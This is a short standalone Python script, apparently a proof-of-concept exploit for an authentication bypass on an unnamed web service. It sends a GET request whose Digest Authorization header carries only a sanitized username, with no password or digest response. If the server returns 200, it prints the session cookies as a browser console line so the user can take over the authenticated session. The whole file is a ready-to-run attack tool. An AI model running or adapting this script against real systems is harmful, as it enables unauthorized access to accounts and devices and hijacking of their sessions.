#!/usr/bin/env python3

import re
import sys
import requests
from requests.structures import CaseInsensitiveDict

# This is where the magic happens! 
def execute(hostname, port, user):
    url = "http://" + hostname + ":" + port

    # We do this to format the HTTP GET Request, you can change these parameters or even add more (depends on your browser)
    headers = CaseInsensitiveDict()
    headers["Host"] = hostname + ":" + port
    headers["Cache-Control"] = "max-age=0"
    headers["Authorization"] = "Digest username=\"" + re.sub('[^A-Za-z0-9]+', '', user) + "\"" # This part is important
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36"
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    headers["Accept-Encoding"] = "gzip, deflate"
    headers["Accept-Language"] = "en-GB,en-US;q=0.9,en;q=0.8"
    headers["Connection"] = "close"

    print("[+] Sending HTTP GET Request to " + hostname + ":" + port)
    resp = requests.get(url, headers=headers)
    print("[+] HTTP Response Code: " + str(resp.status_code))
    if str(resp.status_code) == "200": # If the Response is 200 OK, the exploit was successful
        for c in resp.cookies: # If something goes wrong, we should see a 401 or 502
            # Copy and paste this cookie into Mozilla Firefox's or Google Chrome's Console and Refresh the page
            print("[+] Exploit Success: document.cookie = \'" + str(c.name) + "=" + str(c.value) + "\'")
    else:
        print("[+] Exploit Failed")
    
    return ("[+] Exploit Complete")

if __name__ == '__main__':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))

